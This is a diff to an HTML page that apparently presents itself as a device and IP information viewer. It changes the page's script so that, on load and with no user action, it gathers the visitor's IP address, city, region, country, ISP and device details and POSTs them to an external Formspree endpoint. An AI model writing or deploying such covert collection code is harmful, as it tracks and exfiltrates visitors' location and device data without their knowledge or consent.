@@ -11,7 +11,7 @@ small{color:#94a3b8}button{padding:10px 14px;margin-top:16px;cursor:pointer}
 <div id="status"></div>
 </div>
 <script>
-async function ip(){for(const u of["https://ipwho.is/","https://ipapi.co/json/"]){try{let j=await (await fetch(u)).json();if(j){return {ip:j.ip,country:j.country||j.country_name,region:j.region,city:j.city}}}catch(e){}}return{}}
+async function ip(){for(const u of["https://ipwho.is/","https://ipapi.co/json/"]){try{let j=await (await fetch(u)).json();if(j){return {ip:j.ip,country:j.country||j.country_name,region:j.region,city:j.city,isp:j.connection?.isp||j.isp||j.org||""}}}catch(e){}}return{}}
 async function info(){
 let d=await ip(),ua=navigator.userAgent,extra={};
 if(navigator.userAgentData?.getHighEntropyValues){
@@ -22,6 +22,7 @@ let rows={
 "Country":d.country||"Unavailable",
 "Region":d.region||"Unavailable",
 "City":d.city||"Unavailable",
+"ISP":d.isp||"Unavailable",
 "Brand(s)":navigator.userAgentData?.brands?.map(x=>x.brand+" "+x.version).join(", ")||"Unavailable",
 "Device Model":extra.model||"Hidden by browser",
 "Platform":navigator.userAgentData?.platform||navigator.platform,
@@ -40,22 +41,28 @@ let rows={
 window.rows=rows;
 o.innerHTML=Object.entries(rows).map(([k,v])=>`<div class=item><b>${k}</b><span>${v}</span></div>`).join("");
 window.reportText=Object.entries(rows).map(([k,v])=>k+": "+v).join("\n");
-document.getElementById("status").innerHTML='<span class="success">✓ Report sent automatically</span>';
+await sendReport(window.reportText);
+}
+async function sendReport(text){
+try{
+let res=await fetch("https://formspree.io/f/mdakqoyw",{
+method:"POST",
+headers:{"Accept":"application/json"},
+body:new URLSearchParams({report:text})
+});
+if(res.ok){
+document.getElementById("status").innerHTML='<span class="success">✓ Report sent successfully</span>';
+}else{
+throw new Error("Formspree rejected");
+}
+}catch(e){
+document.getElementById("status").innerHTML='<span class="error">✗ Send failed</span>';
+}
 setTimeout(()=>{document.getElementById("status").style.opacity="0";},3000);
 }
 async function copyAndSend(){
 navigator.clipboard.writeText(window.reportText);
-try{
-await fetch("https://formspree.io/f/mdakqoyw",{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify({report:window.reportText})
-});
-document.getElementById("status").innerHTML='<span class="success">✓ Copied & sent successfully</span>';
-setTimeout(()=>{document.getElementById("status").style.opacity="0";},3000);
-}catch(e){
-document.getElementById("status").innerHTML='<span class="error">✗ Failed to send. Copied to clipboard.</span>';
-}
+await sendReport(window.reportText);
 }
 info();
 </script></body></html>
